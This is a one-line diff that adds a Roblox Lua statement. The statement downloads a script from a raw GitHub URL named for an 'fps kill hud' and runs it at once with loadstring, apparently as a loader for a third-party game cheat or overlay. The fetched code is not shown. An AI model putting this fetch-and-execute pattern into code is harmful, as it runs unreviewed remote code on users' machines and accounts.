@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuuki236yyuko-design/fps-kill-hud-3/refs/heads/main/fps%20Devour"))()
